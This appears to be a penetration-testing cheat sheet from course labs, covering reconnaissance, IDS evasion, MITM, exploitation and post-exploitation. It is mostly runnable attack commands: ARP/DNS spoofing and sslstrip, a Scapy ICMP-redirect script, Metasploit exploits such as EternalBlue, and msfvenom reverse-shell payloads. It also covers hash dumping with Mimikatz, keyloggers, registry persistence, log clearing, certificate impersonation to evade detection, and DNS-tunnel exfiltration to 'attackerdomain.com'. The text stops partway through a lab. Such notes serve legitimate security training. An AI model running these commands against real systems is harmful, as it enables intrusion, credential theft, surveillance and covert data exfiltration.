# Network Security

## Information Gathering

##### Search Engines

Google Dork :
```Google
site:[website] filetype:[filetype]
```

```Google
cache:[URL]
```

theHarvester :
```bash
theharvester -d  domain.com -l 100 -b google
```
- **-d** is the domain
- **-l** limits the results to the value specified
- **-b** data source

Interesting Tools :
- [DNSdumpster](https://dnsdumpster.com/)
- [Shodan](https://www.shodan.io)
- [Exploits Shodan](https://exploits.shodan.io)
- [FOCA](https://www.elevenpaths.com/labstools/foca/index.html)
- [Maltego](https://www.maltego.com)

##### DNS Enumeration

Whois :
```bash
whois domain.com
```

IP Resolve :
```bash
dig domain.com
```
```bash
nslookup domain.com
```

Nameserver lookup :
```bash
dig domain.com NS
```
```bash
nslookup -type=NS domain.com
```


Reverse DNS lookup :
```bash
dig domain.com PTR
dig axfr -x 192.168 @DNS_IP 
```
```bash
nslookup -type=PTR domain.com
```

Mail Exchange lookup :
```bash
dig domain.com MX
```
```bash
nslookup -type=MX domain.com
```

Zone transfers :
```bash
dig axfr @DNS_IP domain.com +nocookie
```
```bash
nslookup
> server [nameserver for domain.com]
> 1s -d domain.com
```


DNS Tools :
```bash
fierce --domain domain.com 
```
```bash
fierce --domain domain.com --dns-servers {IP}
```

```bash
dnsenum domain.com
```
```bash
dnsenum domain.com --dnsserver {DNS IP}
```
```bash
dnsenum domain.com -f {subdomain file}
```

```bash
dnsmap domain.com
```
```bash
dnsmap domain.com -w {subdomain file}
```

```bash
dnsrecon -d domain.com
```
```bash
dnsrecon -d domain.com -n {NS IP}
```
```bash
dnsrecon -d domain.com -{scan option}
```


**Labs**
```
# Scan - Check opened DNS port
$ nmap -sS -p53 witrap.com


# How many A Records are present for witrap.com and its subdomains?
$ dig axfr witrap.com @192.199.31.3


# What is the machine's IP address that supports LDAP over TCP on witrap.com ?
$ dig axfr witrap.com @192.199.31.3


# Can you find the secret flag in the TXT record of a subdomain of witrap.com?
$ dig axfr witrap.com @192.199.31.3


# What is the subdomain for which only reverse dns entry exists for witrap.com? witrap owns the IP address range: 192.168..
$ dig axfr -x 192.168 @192.199.31.3


# How many records are present in the reverse zone for witrap.com (excluding SOA)? witrap owns the IP address range: 192.168..
$ dig axfr -x 192.168 @192.199.31.3

```



## Scanning


##### **Host discovery**


```bash
fping -asgq 192.168.1.0/24
```
```bash
nmap -sn 192.168.1.0/24
```
```bash
hping3 -1 192.168.1.x --rand-dest -I eth0
```

```bash
nmap -sS -p53 [NETBLOCK]
```
```bash
nmap -sU -p53 [NETBLOCK]
```


##### **Scanning techniques**

```
nmap -sS target                         # SYN scan
nmap -sA target                         # ACK scan
nmap -sF target                         # FIN scan
nmap -sN target                         # Null scan
nmap -sO target                         # IP Protocol scan
nmap -sX target                         # XMAS scan

hping3 -S target -c 1                         # SYN scan
hping3 -A target -c 1                         # ACK scan
hping3 -F target -c 1                         # FIN scan
hping3 -F -P -U target -c 1                   # XMAS scan
```

Idle/Zombie scan
```
nmap -O -v -n targetZombie
nmap --script ipidsec targetZombie
nmap -Pn -sI [targetZombie]:[port] [target] -p [port] -v
```

```
hping3 -S -r -p [port] [targetZombie]
hping3 -a [targetZombie] -S -p [port] [target]
```

FTP bounce scan :
```
nmap -Pn -b [ftpvulnerable] [target]
```



##### **Service and OS detection**

```
nc [targetIP]:[Port]                      # Banner Grabbing
nmap -sV target                           # Version Scan
nmap -sV -sC target                       # Version/Script Scan
nmap -O target                            # OS Detection
nmap -A target                            # Version/Script/OS/Traceroute Scan
```

```
./p0f -i [interface]
```


##### **Firewall/IDS Evasion**


Fragmentation 
```
nmap -sS -f [target]
nmap -sS -f --data-lenght 100 [target]
```

Decoy 
```
nmap -sS -D [spoofIP],[spoofIP],ME,[spoofIP] [target]
nmap -sS -D RND:10 [target]
```

Source ports
```
nmap -sS --source-port [source port] [target]
hping3 -S -s [source port] [target]
```

Packet header 
```
nmap -sS --data-lenght 10 [target]
hping3 -S --data 24 [target] -p [port]
```

Mac address spoofing
```
nmap -sS --spoof-mac [mac] [target]
```

Timing
```
nmap -iL [hosts.txt] -sS -T [Timing option]

0 - 5 min
1 - 15 sec
2 - 0.4 sec
3 - default
4 - 1 msec
5 - 5 msec
```







## Enumeration


#### NetBIOS 


NetBIOS enumeration from Windows
```
nbtstat -n                                 #NetBIOS names on our machine

nbtstat -A <target_IP>                     #NetBIOS names on target machine
```

NetBIOS enumeration from Linux
```
nbtscan -v <target_IP>                     #NetBIOS names on target machine

nbtscan -v <target_IP>/24                  #NetBIOS names with subnetmask
```



#### SMB Shared folder 

Resource enumeration from Windows
```
net view <target_IP>                       #List shared resources

net use K: \\{target IP}\{Share}           #Connect shared resource 
```

BruteForce attempts for shares with [Nat10bin](https://github.com/Phenomite/Old-tools-to-keep)
```
nat.exe -u <userlist> -p <passlist> <target_IP>
```


Resource enumeration from Linux
```
smbclient -N -L <target_IP>                   #List shared resources

mount.cifs //{target_IP}/{Share} /media/myshare/ user=,pass=.   #Mount share
```


#### Null Session

Check if system is vulnerable against **Null Session**
```
net use \\<target IP>\IPC$ "" /u:""
```

Tools to enumerate target through **Null Session** - Windows

[Dumpsec](https://www.systemtools.com/somarsoft/index.html)
```
1. Click `Report` -> `Select Computer` -> Insert Target IP
2. Click `Report` -> `Dump Users as column`
3. After everything is set, click `OK`
```
[Winfingerprint](https://github.com/kkuehl/winfingerprint)  

[Winfo](https://www.vidstromlabs.com/freetools/winfo/)
```
winfo <taget_IP> -n
```



Tools to enumerate target through **Null Session** - Linux

```
enum4linux <target_IP>

rpcclient -N -U "" <target_IP>
```



#### SNMP

Script scan
```
nmap -sU -p 161 --script [script_name] [target]
```

Community string Brute Force
```
nmap -sU -p 161 --script snmp-brute [target]
```

Community string Brute Force with custom wordlist 
```
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<wordlist> [target]

Wordlist - /usr/share/wordlist/seclists/Misc/wordlist-common-snmp-community-strings.txt
```

Enumeration :
```
snmpwalk -v [1/2c/3] -c [community string] [target_ip] [MIB]
```

Change value of an attribute 
```
snmpset -v [1/2c/3] -c [community string] [target_ip] [MIB] [var type] [value]
```





#### Pivoting
```
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p

background
use auxiliary/server/socks_proxy
show options
set SVRPORT [9050]
set VERSION [4a]
exploit
jobs

bash > proxychains nmap -sT -Pn -sV -p 445 10.10.11.15

# Port Forwarding
meterpreter > portfwd add -l 1234 -p 80 -r 10.100.40.107

# Browse through proxy
proxychains iceweasel

# Communicate through victim2 to victim 1 -  10.10.11.0 and 10.10.10.0
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -s 10.10.11.0/24
msf > # Set payload with LHOST of victim 1 and then traffic goes between them

``` 




## Sniffing & MITM Attacks


#### ARP

ARP scan
```
arp-scan 
```

Check ARP table :
```
arp -a                               #Windows

arp                                  #Linux
```


#### Sniffing Tools

```
dsniff <options>
```

```
Wireshark
	http.request.method == "POST"
	htt.authbasic
```

```
Tcpdump <options> <filter expresions> 
	tcpdump -i eth0
	tcpdump -i eth0 -xxAXXSs 0
	tcpdump -i eth0 -xxAXXSs 0 dst [testination IP]
	tcpdump -i eth0 host domain.com
	tcpdump -i eth0 port 3389
	tcpdump -i eth0 src [source_IP] and dst [destination_IP]
	tcpdump -i eth0 -F [filter file]
	tcpdump -i eth0 -w [output.txt]
	tcpdump -i eth0 -r [output.txt]
	tcpdump -i eth0 | grep [?]
```

```
Windump
```

```
driftnet <options>                         # Capture Photos during MITM
```

####### **Responder/Multirelay**

```
# Responder Tools - /usr/share/responder/tools/
# Responder conf file - /usr/share/responder/responder.conf

# Before run multiray attack, disable SMB and HTTP servers on responder.conf

python RunFinger.py -i <target_IP>           # Check if SMB signing is disabled

Responder -I eth0 --lm                       # Run responder
python3 Multirelay.py -t <target_IP> -u ALL  # NTLM Relay to gain shell
```


#### MITM Tools


**Ethercap**
```
# /etc/ettercap/etter.dns                       # Dns Spoofing conf file

ettercap -G                                     # Run as Graphical Interface
	Scan for Host
	Add to Target 1 / Add to Target 2
	Sniff Remote Connections
	View > Connections

```


**Cain & Abel**
```
Windows Tool for MITM attack

refference - https://gbhackers.com/man-in-the-middle-attack-with-cain-and-abel-tool/
```


**Macof**
```
Mac flooding attack against switches. Note to run wireshark.

echo 1 > /proc/sys/net/ipv4/ip_forward           # Enable port forwarding
macof -i [interface]                             # Run mac flooding

```

**Arpspoof**
```
echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i [interface] -t [target 1] [target 2]
arpspoof -i [interface] -t [target 2] [target 1]
```

**Dnsspoof**
```
# Redirect *.sportsfoo.com to 172.16.5.101

echo "172.16.5.101 *.sportsfoo.com" > dns      

dnsspoof -i [interface] -f dns
```

**Bettercap**
```
net.probe on 
net.sniff on

help arp.spoof
help dns.spoof
```

**sslstrip**
```
sslstrip
	echo 1 > /proc/sys/net/ipv4/ip_forward
	iptables -t net -A PREROUTING -p top --destination-port 80 -j REDIRECT --to-port 8080
	sslstrip -a -f -l 8080 -w els_sslt


Ethercap
	Plugins > Manage Plugins > sslstrip


Bettercap
	set https.proxy.sslstrip true
	https.proxy on


sslstrip+
	python mitmf.py -i [interface] --spoof --arp --dns --hsts --gateway [gateway_IP] --targets [target_IP]
	
```


**ICMP redirect**
```
# Identify reachable networks.
$ ip route show dev eth1

#Configure attacker machine to perform IP masquerading.

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE


#Run scapy and paste following code

originalRouterIP='10.100.13.1'
attackerIP='10.100.13.20'
victimIP='10.100.13.126'
serverIP='10.23.56.100'
# We create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
# The ICMP packet payload /should/ contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)


```


**MITM Labs** 
```
#Check Domain name
nslookup                                         
	server <DNS Server>
	<IP>


#Check gateway IP 
traceroute 10.10.10.10 -m 5


#Exploit Samba is_known_pipename()
msfconsole
	use exploit/linux/samba/is_known_pipename
	set RHOST 172.16.5.10
	show advanced
	set SMBUser admin
	set SMBPass et1@sR7!
	set LHOST 172.16.5.101
	set SMB::AlwaysEncrypt false
	exploit



#Web Delivery Module
msfcoonsole
	use exploit/multi/script/web_delivery
	set TARGET 3
	set LHOST 172.16.5.101
	set PAYLOAD windows/meterpreter/reverse_tcp
	exploit
	jobs


meterpreter > run arp_scanner -r 10.100.40.0/24.           # ARP Scan
meterpreter > portfwd add -l 1234 -p 80 -r 10.100.40.107.  # Port Forwarding


set PAYLOAD windows/meterpreter/bind_tcp   # Use this payload during pivoting



```


## Exploitation

#### Weak and Default Passwords / Brute Force

```bash
/usr/share/ncrack/                          # Default Ncrack Wordlists

ncrack ftp://10.10.10.15:21
ncrack ftp://10.10.10.15:21 ssh://10.10.10.15:22
ncrack 10.10.10.10,15 -p ftp:21,smb

ncrack -u admin -P /usr/share/ncrack/top50000.pwd -f ssh://10.10.10.15 

ncrack -iX nmap_oX_output -u root -P /usr/share/wordlists/rockyou.txt

ncrack ftp://10.10.10.15:21 --save session
ncrack ftp://10.10.10.15:21 --resume session
```


```
Medusa -d                                   # List all avaliable modules
medusa -M <module> -q                       # Module usage information

medusa -h 10.10.10.15 -M ssh -u root -P /usr/share/wordlist/rockyou.txt
```


```
patator                                     # List all available modules
patator <module> --help                     # Module usage information

patator ftp_login host=10.10.10.15 user=root password=FILE0 0=wordlist.txt
```

```
Hydra
Hydra -l root -P /usr/share/wordlist/rockyou.txt 10.10.10.15 ssh
```


```
Eyewitness                             # Quickly identify low-hanging fruit
./EyeWitness/Python/setup/setup.py.    # Setup

python3 eyewitness.py --headless --prepared-https -f urls.txt
```


#### Password Generator

```
# Rsmangler - Tool for password permulation

cat words.txt | rsmangler --file - > mew_words.txt
```

```
# Cewl - Tool to take keywords form target website

cewl -m 8 https://target.com
```

```
# Cupp - Tool to generate password depends on input

cupp -i
```

```
# Crunch - Generate custom wordlist

crunch 8 8 -t ,@123456 -o wordlist.txt
```

```
sed -ri '/^.{,7}$/d' william.txt                # Remove Passwords Shorter Than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt`.   # Remove Passwords With No Special Chars
`sed -ri '/[0-9]+/!d' william.txt`              # Remove Passwords With No Numbers
```



#### Exploit


**[SMB Capture With Metasploit](https://web.archive.org/web/20140819013932/http:/www.rapid7.com/db/modules/auxiliary/server/capture/smb)**
```
msf > use auxilary/server/capture/smb
```

**Crack NTLMv1 hash with John/rainbow**
[rcracki_mt](https://github.com/foreni-packages/rcracki_mt)
[rainbow tables](http://project-rainbowcrack.com/table.htm)
```
# Crack with John
john --format=netlm {hash file}


# Crack with Rainbow Tables

# halflm_second.rb - /usr/share/metasploit-framework/tools/password/
# netntlm.pl - /usr/share/metasploit-framework/data/john/run.linux.x64.mmx/
# netntlm.pl - /usr/share/john/netntlm.pl

rckracki_mt -h {First 8 byte of LMHASH} -t 4 *.rti

ruby halflm_second.rb -n {Entire NTHASH} -p {Previosly cracked 8 byte NTHASH cleartext password}

perl netntlm.pl -file {Hash file} -seed {Cracked Password}
```

**SMB Relay Attack**
```
msf > use exploit/windows/smb/smb_relay

impacket-smbrelayx -h {target_IP} -e smbexp.exe
```

**NTLM Relay attack**
```
impacket-ntlmrelayx -t [target_IP] -smb2support
```

**Generate msfvenom Payload**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o smbexp.exe 

msf > use exploit/multi/handler
```

**SMTP Exploit**
```
# Check if authentication is required

telnet <IP> 25
> EHLO domain.com

-----------------------------------------------------------------------------

# Python script to run unauthenticated with attachment

	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.application import MIMEApplication
	
	# Email server settings
	smtp_host = 'demo.ine.local'
	smtp_port = 25
	
	# Sender and recipient details
	sender_email = 'sender@example.com'
	recipient_email = 'recipient@example.com'
	
	# Email content
	subject = 'Test Email with Attachment'
	body = 'This is a test email sent from Python with an attachment.'
	
	# Create a MIMEMultipart object
	msg = MIMEMultipart()
	msg['Subject'] = subject
	msg['From'] = sender_email
	msg['To'] = recipient_email
	
	# Attach body as plain text
	msg.attach(MIMEText(body, 'plain'))
	
	# Attach the file
	attachment_path = '/path/to/attachment/file.txt'
	with open(attachment_path, 'rb') as attachment_file:
	    part = MIMEApplication(attachment_file.read())
	    part.add_header('Content-Disposition', f'attachment; filename="{attachment_path}"')
	    msg.attach(part)
	
	try:
	    # Connect to the SMTP server
	    server = smtplib.SMTP(smtp_host, smtp_port)
	
	    # Send the email
	    server.sendmail(sender_email, [recipient_email], msg.as_string())
	
	    # Close the connection
	    server.quit()
	    print("Email with attachment sent successfully!")
	except Exception as e:
	    print(f"Failed to send email with attachment: {e}")

```

**EternalBlue (MS17-010)**
```
msf > use auxiliary/scanner/smb/smb_ms17_010            # Scan

msf > use exploit/windows/smb/ms17_010_eternalblue      # Exploit
```

**Client-Side Exploitation -  Mozilla Firefox resource: URL Remote Code Execution Vulnerability**
```
msf > use exploit/multi/browser/firefox_pdfjs_privilege_escalation
msf > info
msf > set SRVHOST <local_IP>
msf > set SVRPORT <port>
msf > exploit
```

**Client-Side Exploitation -  Adobe Flash Player ByteArray Use After Free**
```
msf > use exploit/multi/browser/adobe_flash_hacking_team_uaf
```

**Remote-Side Exploitation -  Microsoft Security Bulletin MS08-067**
```
msf > use exploit/windows/smb/ms08_067_netapi
```


**MSFConsole**
```
msf > help
msf > search type:exploit platform:windows
msf > search author:HDM
msf > search cve:2015
msf > grep vnc search type:exploit

msf > show exploits
msf > show payloads

msf > info <exploit>


meterpreter > background                                
meterpreter > session -i <session_id>                  
meterpreter > download
meterpreter > upload
meterpreter > edit
meterpreter > execute -f cmd.exe -i H
meterpreter > search -f <file.*>
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows gather/enum_services

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

meterpreter > clearev                                     # Clear System logs

meterpreter > load kiwi                                   # Load Mimikatz
meterpreter > help
meterpreter > creds_all


```

**MSFConsole with Nessus**
```
service postgreqsl start                              # Start database


msf > load nessus
msf > nessus_connect user:password@localhost
msf > nessus_scan_list
msf > nessus_report_hosts <id>
msf > nessus_reports_vulns <id>
msf > nessus_db_import <id>
msf > vulns                                           # List Vulnerabilities
```


**Exploit Labs**
```
nmap -iN hosts --script vuln

exploit/unix/ftp/proftpd_133c_backdoor                 # demo.ine.local
exploit/multi/misc/java_rmi_server                     # demo2.ine.local
auxiliary/scanner/mysql/mysql_authbypass_hashdump      # demo3.ine.local
exploit/multi/http/apache_mod_cgi_bash_env_exec        $ demo4.ine.local

-----------------------------------------------------------------------------

Nessus Scans

auxiliary/scanner/ssl/openssl_heartbleed

-----------------------------------------------------------------------------

SMTP Exploit > Send email with attachment > Pivoting > Badblue Exploit.

-----------------------------------------------------------------------------

Arpspoof > Dnsspoof > msfvenom > smbrelayx

arpspoof -i eth1 172.16.5.1 172.16.5.5
arpspoof -i eth1 172.16.5.5 172.16.5.1
echo "172.16.5.101 *.sportsfoo.com" > dns
dnsspoof -i eth1 -f dns
impacket-ntlmrelayx -t 172.16.5.10 -smb2support
impacket-smbrelayx -h 172.16.5.10
```

## Post Exploitation

#### Privilege Escalation

**Windows**
```
# Migrate Process to avoid session lossing the session
meterpreter > run post/windows/manage/migrate

meterpreter > migrate -h
meterpreter > migrate <PID>

-----------------------------------------------------------------------------
# Automatically escalate privilege by finding best technique
meterpreter > getsystem
meterpreter > getuid

-----------------------------------------------------------------------------
# UAC Bypass
meterpreter > run post/windows/gather/win_priv      # Check if UAC is enabled
meterpreter > search bypassuac
msf > use exploit/windiws/local/bypass_vbs
msf > set session <session_id>
msf > exploit                            # Gain administrator rights
meterpreter > getsystem                  # From administrator to NT/authority


https://github.com/hfiref0x/UACME
meterpreter > upload Akagi64.exe
meterpreter > upload Payload.exe                  # Msfvenom reverse shell
shell > .\Akagi64.exe 23 C:\Payload.exe           # 32 bit system
shell > .\Akagi64.exe 61 C:\Payload.exe           # 32 bit system


-----------------------------------------------------------------------------
# Incognito - Impersonate windows tokens
meterpreter > use incognito              # Better to run with system priv.
meterpreter > list_tokens -u             # List all available tokens
meterpreter > impersonate_token <token>  # Impersonate other user

-----------------------------------------------------------------------------
# Unquoted service path - Exploit service with path injection
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |finder /i /v """        # wmic command to search unqouted service path

C:\> sc qc <service>                                   # manual check
C:\> sc start <service>                                # start service
C:\> sc stop <service>                                 # stop service

msf> use exploit/windows/local/trusted_service_path    # automatically check

msf exploit(multi/handler)> set AutoRunScript migrate -n svchost.exe # Auto run migrate when meterpreter session is captured due to stable reasons.

C:\> icacls <folder>                            # Check folder permissions

-----------------------------------------------------------------------------
```

**Linux**
```
# Gather Info
meterpreter > run post/linux/gather/enum_system


# Publicly available privilage escalation exploits
meterpreter > upload exploit.c
meterpreter > shell                                   # Run Shell
meterpreter > execute -f /bin/sh -i -c                # Run Shell
shell > gcc exploit.c -o exploit
shell > ./exploit

attacker > gcc -m32 exploit.c -o exploit           # Compile on local machine


```


#### Maintaining Access

**Password and Hash**
```
meterpreter > run hashdump
meterpreter > run post/windows/gather/smart_hashdump      # Dump hashes

msf > use exploit/windows/smb/psexec             # PTH
impacket-psexec                                  # PTH

-----------------------------------------------------------------------------

# When user is in administrator group but stil cant PTH, enable 
PS> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord

PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord

OR

C:\> reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" \v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f

C:\> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" \v RequireSecuritySignature /t REG_WORD /d 0 /f

-----------------------------------------------------------------------------

# XfreeRDP

xfreerdp /u:user /d:domain /pth:hash /v:host

-----------------------------------------------------------------------------

# Mimikatz - Note to run meterpreter shell as 64 bit

meterpreter > ps -A x86_64 -s                 # Search 64bit process
meterpreter > migrate <64bit_process_pid>     # Change shell to 64bit
meterpreter > load mimikatz                   # Load mimikatz


-----------------------------------------------------------------------------

# Windows Credentials Editor
# https://web.archive.org/web/20200414231958/http:/www.ampliasecurity.com/research/windows-credentials-editor/

meterpreter > execute -i -f wce.exe -a -h

-----------------------------------------------------------------------------

# Enable RDP service
shell> net start                     # List enabled services
shell> wmic service where 'Caption like "Remote%" and started=true' get Caption                              # Check if RDP is enabled

meterpreter > run service_manager -1                      # Check services
meterpreter > run post/windows/gather/enum_services       # Check services

meterpreter > run getgui -h
meterpreter > run getgui -e                       # Enable RDP

shell> net localgroup "Remote Desktop Users" els_user /add    # Add user to RDP Group

rdesktop <IP> -u <user> -p <passwd>               # Login with RDP

net localgroup                                    # List all local groups
net localgroup <group>                            # List members of group
net localgroup "Administrators" <user> /add       # Add user to adm group


```


**Backdoor**
```
# Persistence
meterpreter > run persistence -h
meterpreter > run persistence -A -X -i [time] -P [port] -r [attacked_IP]

msf > use exploit/windows/local/persistence


# Persistence using manual payload generated by MSFvenom/Veil/BDF

C:\> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "payload.exe" -v payload_name            # Add generated payload to startup
```

**New Users**
```
net user <username> <password> /add                   # Create new user
net localgroup "Administrators" <username> /add       # Add user to adm group
net localgroup "Remote Desktop Users" <user> /add     # Add user to RDP group
net localgroup "TelnetClients" <user> /add         # Add user to telnet group

```


**DLL Hijacking/Preloading**
```
# Process Explorer
https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer

# Process Monitor
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

# list of Vulnerable Applications
https://web.archive.org/web/20140222035441/https:/www.exploit-db.com/dll-hijacking-vulnerable-applications/



When a program is launched, the DLL Search Order in most cases is as follows:

1.The directory from which the application was launched
2.The `C:\Windows\System32` directory
3.The 16-bit Windows system directory (i.e, `C:\windows\system`)
4.The Windows directory (`C:\windows`)
5.The current directory at the time of execution
6.Any directories specified by the %PATH% environment variable


Process Explorer - Identify file PATH and associated services  

Process Monitor - Apply filters to check what DLL are loaded.

Services - Stop and start services to display dll processes on Process Monitor

# Run Process Monitor with following filters
Result       > contains >  NAME NOT FOUND
Path         > end with >  .dll
```



#### Data Harvesting/Pillaging

```
meterpreter > sysinfo                            # System info
C:\ > systeminfo                                 # System info
meterpreter > getuid                             # Check user we are running

meterpreter > run post/windows/gather/           # Windows gather scripts
meterpreter > run post/linux/gather/             # Linux gather scripts
meterpreter > ps                                 # Enum services

C:\ > wmic service get Caption,StartName,State,pathName  # Enum services
C:\ > net start                                          # Enum services
C:\ > netstat -ano                                       # Enum services

$ service --status-all                                   # Enum services

C:\ > net view /domain                                 # Gather domain name
meterpreter > run post/windows/gather/enum_domains   # Enum domain/controller
C:\ > net group "Domain Contollers" /domain      # List of domain controllers

meterpreter > run post/windows/gather/enum_ad_users    # Enum AD Users
C:\ > net user /domain                                 # Enum AD Users

C:\ > net localgroup                              # Enum local groups
C:\ > net localgroup "Administrators"        # View members of Administrators

C:\ > net share                                   # Enum shares
meterpreter > run enum_shares                     # Enum shares

meterpreter > run scraper                     # Windowns Enum
meterpreter > run winenum                     # Windows Enum

-----------------------------------------------------------------------------

# Keylogger
meterpreter > keyscan_start                          # Start Keylogger
meterpreter > keyscan_dump                           # Dump Keys
meterpreter > keyscan_stop                           # Stop Keylogger

Note: Migrate to winlogon.exe in order to DUMP windows logon credentials.
Note: Migrate to explorer.exe in order to DUMP user level activities.

meterpreter > run keylogrecorder -h             # Keylogger
meterpreter > run keylogrecorder -c 1           # Keylogger with winlogon.exe
meterpreter > run keylogrecorder -c 0           # Keylogger with explorer.exe

-----------------------------------------------------------------------------

meterpreter > search -h 
meterpreter > search -d C:\\Users\\els\\ -f *.kdbx    # Search KeePass file


meterpreter > run post/windows/gather/credentials/    # List modules related to Credentials
meterpreter > run post/windows/gather/credentials/winscp  # Enum Passwords on local system
meterpreter > run post/windows/gather/credentials/credential_collector  # Dump Hashes and Tickets
meterpreter > run post/windows/gather/enum_chrome     # Retrieve Creds stored in Chrome

meterpreter > run post/multi/gather/            # List Another gather modules
meterpreter > run post/windows/gather/enun_applications   # Enum Applications
```

**Data Exfitration with DNS Tunelling**
```
#https://github.com/yarrick/iodine

1. Register domain name through godaddy.com - For example attackerdomain.com
2. Host on the internet to use as DNS server. - for example 100.50.50.100
3. Add Hostnames on godaddy.com - ns1.attackerdomain.com / ns2.attackerdomain.com with IP address of our created host 100.50.50.100
4. Change Nameservers to ns1.attackerdomain.com and ns2.attackerdomain.com on godaddy.com

Configure iodine as server on 100.50.50.100 host 
	iodine -u user -p 'Password123' -f 10.0.0.1 ns1.attackerdomain.com

Configure iodine as client on internal host
	iodine -p "Password123" ns1.attackerdomain.com -T CNAME -r -f 

Check if we got new Network Interface with ifconfig command

In order to tunnel all of our data securely, create local SSH socks proxy
	ssh user@10.0.0.1 -D 10.0.0.2:1234 -N -C 

Use browser as SOCKS5 proxy with 10.0.0.2:1234

```

**Post Exploitation Scripts** 
	[Windows Post-Exploitation](https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US)
	[Linux/Unix/BSD Post-Exploitation](https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US)
	[# Linux Post Exploitation](https://web.archive.org/web/20150317144317/https:/n0where.net/linux-post-exploitation)
	[OS X Post-Exploitation](https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US)
	[Metasploit Post-Exploitation](https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&pli=1)

**Offline Tool for Post Exploitation** - [post-exploitation-wiki](https://github.com/mubix/post-exploitation-wiki)




#### Mapping Internal Network

```
# Network Interfaces
meterpreter > ifconfig
C:\ > ipconfig /all
C:\ > ipconfig /displaydns                             # DNS cache
$ ifconfig

# Route 
meterpreter > route
C:\ > route print
$ route -v

# Arp cache
meterpreter > arp
C:\ > arp -a
$ arp

# Opened/Connected/Estabilished Ports/Hosts
meterpreter > netstat
C:\ > netstat -ano
$ netstat -tulpn

# internal host detection
meterpreter > run arp_scanner -h
meterpreter > run arp_scanner -r 10.10.10.0/24

# Ping scan
msf > use post/multi/gather/ping_sweep

# Port scan
msf > use auxiliary/scanner/portscan/

# Network enumerator 
meterpreter > run netenum -h

```


**Meterpreter SSL Certificate Impersonation and Detection Evasion**
```
# Generate SSL Payload to impersonate as Microsoft SLL certificate
msf > use auxiliary/gather/impersonate_ssl
msf > set RHOST www.microsoft.com
msf > run
msf > use payload windows/x64/meterpreter/reverse_https
msf > set LHORT [local_IP]
msf > set LPORT 443
msf > set handlersslcert [generated .pem file]
msf > set stagerverifysslcert true
msf > generate -t exe -f /ssl_payload.exe

# Set Multi Handler
msf > use exploit/multi/handler
msf > set LHOST [local_IP]
msf > set LPORT 443
msf > set handlersslcert [generated .pem file]
msf > set stagerverifysslcert true
msf > set payload windows/x64/meterpreter/reverse_https
msf > exploit -j

# Run ssl_payload.exe on target and check traffic in wireshark to verify that Microsoft SSL certificate is used to encrypt data in order to evasion of detection systems.
```


**Obtaining Stored Credentials with SessionGopher**
```
# https://github.com/Arvanaghi/SessionGopher

# Run Locally
.\SessionGopher.ps1
Invoke-SessionGopher -Thorough

# Run Remotely
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -iL computerlist.txt -u domain.com\adm-arvanaghi -p s3cr3tP@ss -o

Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Target brandonArvanaghi_win7 -Thorough
```



#### Labs

**Post-Exploitation**
```
# Target - demo.ine.local , demo1.ine.local


# Scan Host1
nmap -sS -sV demo.ine.local

# Httpfileserver 2.3.x is used, so exploit it with meterpreter
msf > exploit/windows/http/rejetto_hfs_exec
meterpreter > getsystem                       # Get System privilages

# Enum applications, FileZilla Client 3.57.0 is used
meterpreter > run post/windows/gather/enum_applications 
meterpreter > post/multi/gather/filezilla_client_cred      # Get FTP Creds

# Pivoting
meterpreter > run autoroute -s <subnet_host1> -n <netmask>
meterpreter > run autoroute -s <subnet_host2> -n <netmask>  # For reverse_tcp
msf > use auxiliary/server/socks_proxy
msf > set version 4a
msf > set 

# Scan Host2 / Port 21 is opened and connect with creds retrieved before
proxychains ftp demo1.ine.local
ftp > get username.txt                     # File of local users

# Brute force local users / get them creds
proxychains hydra -l administrator -P /usr/share/wordlists/rockyou.txt demo1.ine.local smb
proxychains hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt demo1.ine.local smb


# RCE on Host2
